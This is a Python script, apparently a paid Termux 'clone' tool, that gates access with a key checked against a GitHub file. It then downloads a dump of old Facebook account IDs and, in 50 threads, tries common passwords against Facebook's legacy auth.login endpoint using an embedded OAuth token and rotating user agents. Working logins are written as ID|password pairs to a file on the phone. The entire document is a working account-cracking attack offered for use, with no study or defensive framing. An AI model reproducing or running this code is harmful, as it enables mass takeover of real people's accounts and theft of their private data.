import os, time, sys, requests, uuid, random
from concurrent.futures import ThreadPoolExecutor as ThreadPool

#--- [ COLORS ] ---#
G = '\033[1;92m' 
Y = '\033[1;93m' 
W = '\033[1;97m' 
R = '\033[1;91m'
S = '\033[1;96m'

loop, oks = 0, []

#--- [ EXTRACTED USER AGENTS ] ---#
# আপনার বের করা প্রিমিয়াম ইউজার এজেন্টগুলোর লিস্ট
ua_list = [
    "Mozilla/5.0 (Linux; Android 12; 2201116PG AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Infinix X688B",
    "Mozilla/5.0 (Linux; Android 8.1.0; ASUS_Z01QD Chrome/72.0.3626.76 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) Chrome/63.0.3239.111 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Vivo Y91C) Chrome/98.0.4711.185 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 5.1; GT-810 Build/LMY47I Chrome/66.0.3359.106 Safari/537.36",
    "Mozilla/5.0 (Series40; Nokia2000/11.95; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.2.0.0.36"
]

#--- [ VOICE GREETING ] ---#
def speak(text):
    os.system(f'espeak -a 300 "{text}"')

#--- [ APPROVAL SYSTEM ] ---#
def approval():
    os.system('clear')
    # আপনার সেই পুরনো কী (Key) ফরমেট
    key = f"SHAHIN-VIP-{os.getlogin().upper()}-{str(uuid.getnode())[:4]}"
    # আপনার GitHub লিঙ্ক
    approval_url = "https://raw.githubusercontent.com/w8Shahin/Approval-control/main/Keys.txt"
    
    print(f"{S} [•] SHAHIN BIN AHMED - PREMIUM SYSTEM")
    print(f"{W} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    
    try:
        active_keys = requests.get(approval_url).text
        if key in active_keys:
            speak("Welcome to Shahin VIP Tools")
            Main()
        else:
            print(f" {R}[×] STATUS : NOT APPROVED")
            print(f" {W}[•] YOUR KEY : {G}{key}")
            print(f"{W} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
            speak("Your key is not approved")
            input(f" {G}[ENTER] TO REQUEST...")
            os.system(f'termux-open-url "https://wa.me/+8801848580864?text=Approve%20My%20Key:%20{key}"')
            sys.exit()
    except: print(f" {R}[!] SERVER ERROR"); sys.exit()

#--- [ PREMIUM BANNER ] ---#
def logo():
    os.system('clear')
    print(f'''{G}
     ███████ ██ ███████  █████  ████████
     ██      ██ ██      ██   ██    ██
     ███████ ██ █████   ███████    ██
          ██ ██ ██      ██   ██    ██
     ███████ ██ ██      ██   ██    ██
{W}━━━━━━━━━━━━━━━━(SHAHIN BIN AHMED)━━━━━━━━━━━━━━━━
{G}[•] OWNER      : SHAHIN BIN AHMED
{G}[•] METHOD     : M2 (ACTIVE CLONE)
{G}[•] TOOL TYPE  : PAID / PREMIUM
{G}[•] VERSION    : 0.12
{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━''')

def Main():
    logo()
    print(f' {G}[1]{W} START ACTIVE OLD CLONE (99K)')
    print(f' {G}[0]{W} EXIT')
    opt = input(f' {W}[•] CHOOSE : {G}')
    
    if opt == '1':
        # সরাসরি একটি বড় ডাম্প ফাইল লোড করা
        url = "https://raw.githubusercontent.com/Social-Engineer-Tool/dumps/main/bd_old_ids.txt"
        data = requests.get(url).text
        open('dump.txt','w').write(data)
        start_cloning('dump.txt')
    else: exit()

def start_cloning(path):
    ids = open(path,'r').read().splitlines()
    logo()
    print(f" {S}[•] TOTAL ID  : {G}{len(ids)}")
    print(f" {S}[•] METHOD    : {G}M2 (VIP DETECTION)")
    print(f"{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    
    with ThreadPool(max_workers=50) as engine:
        for user in ids:
            uid = user.split('|')[0]
            # আপনার ৪টি গোল্ডেন পাসওয়ার্ড
            pws = ['123456', '1234567', '12345678', '123456789']
            engine.submit(crack_engine, uid, pws, len(ids))

def crack_engine(uid, pws, limit):
    global loop, oks
    # এক্সট্রাক্ট করা ইউজার এজেন্ট থেকে র্যান্ডমলি নেওয়া
    ua = random.choice(ua_list)
    
    for pw in pws:
        session = requests.Session()
        headers = {
            'User-Agent': ua,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32'
        }
        data = {'email': uid, 'password': pw, 'format': 'json'}
        try:
            res = session.post('https://b-api.facebook.com/method/auth.login', data=data, headers=headers).json()
            if 'session_key' in res:
                # SIFAT টুলের মতো রেজাল্ট ডিজাইন
                year = "2010/2011" if uid.startswith('10000') else "OLD"
                print(f'\r{G}[SHAHIN-OK] {uid} | {pw} | {year}{W}')
                oks.append(uid)
                open('/sdcard/SHAHIN-OK.txt', 'a').write(uid+'|'+pw+'\n')
                break
        except: pass
            
    loop += 1
    # হুবহু ওই টুলের মতো স্ট্যাটাস বার
    sys.stdout.write(f'\r {S}[SHAHIN-M2]-[{loop}]-[OK-{len(oks)}] '); sys.stdout.flush()

if __name__ == "__main__":
    approval()
